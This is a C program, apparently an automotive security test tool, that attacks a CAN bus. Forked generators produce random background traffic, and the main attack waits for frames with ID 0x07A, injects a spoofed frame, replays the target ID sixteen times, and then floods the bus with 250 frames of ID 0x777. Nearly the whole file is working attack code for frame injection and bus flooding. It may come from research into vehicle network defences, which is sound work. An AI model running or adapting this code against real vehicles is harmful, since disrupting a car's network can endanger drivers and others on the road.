#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/wait.h>
#include "canox.h"

#define MAX_LONG_NAME 255
#define ID_TEST 0x07A
char interface[MAX_LONG_NAME];

void run_generators() {
  srand(time(NULL) ^ getpid() ^ (getppid() << 16));
  while(1) {
    int delay_ms = 5 + rand() % (125 - 15 + 1); 
    usleep(delay_ms * 1000);
    int id = rand() % 51 + 50;
    if (id != ID_TEST) {
      struct can_frame frame;
      frame.can_id = id;
      frame.can_dlc = rand() % 9;      
      for (int i = 0; i < frame.can_dlc; i++) {
          frame.data[i] = rand() % 256;
      }

      write_can_frame(&frame);
    }
  }
}

void attack() {
  // if (initialize_can_interface(interface, 1)) {
  //   fprintf(stderr, "Error initializing interface!\n");
  //   return;
  // }
  if (setup_filter_attack(ID_TEST)) {
    fprintf(stderr, "Error applying filter!\n");
    return;
  }
  
  int n = 0;
  char has_message = 1;

  while(n<MAX_ATTEMPTS && has_message) {
    n++;
    struct can_frame frame;
    while (frame.can_id != ID_TEST) {
      read_can_frame(&frame);
    }
    
    usleep(10*940);

    frame.can_id = 0x1;
    for (int j = 0; j < frame.can_dlc; j++) {
      frame.data[j] = 0;
    }
    write_can_frame(&frame);
    frame.can_id = ID_TEST;
    for (long int i = 0; i < 16; i++) {
      write_can_frame(&frame);  
      // usleep(2*1000);
    }
    printf("\nFINISHED FRAME INJECTION\n"); 
    printf("FLOODING THE BUS CAN\n");
    for (long int i = 0; i < 250; i++) {
      frame.can_id = 0x777;
      write_can_frame(&frame);  
      usleep(2*999);
    }
    if (1){
      has_message = 0;
    }
  }

  printf("\nFINISHED ATTACK!\n");
}

int main(int argc, char **argv){
  int num_generators = 1;
  atexit(cleanup);
  if (argc > 1) {
      snprintf(interface, sizeof(interface), "%s", argv[1]);
  }
  if (argc > 2) {
      num_generators = atoi(argv[2]);
  }
  if (argc < 2) {
      fprintf(stderr, "You need to specify an interface!\n");
      printf("Usage: %s <interface> [<num_generators>]\n", argv[0]);
      return 1;
  }

  printf("Generators: %d", num_generators); 
  pid_t children[num_generators];


  if (initialize_can_interface(interface, 0)) {
    perror("Error during initialization");
    return 1;
  }
  
  if (initialize_can_interface(interface, 1)) {
    perror("Error during initialization");
    return 1;
  }

  for (int i = 0; i<num_generators; i++) {
    pid_t pid = fork();
    children[i] = pid;
    if (pid == 0) {
      run_generators();
      return 0;
    }
  }

  attack();

  for(int i = 0; i<num_generators; i++) {
    kill(children[i], SIGTERM);
    waitpid(children[i], NULL, 0);
  }

  return 0;
}
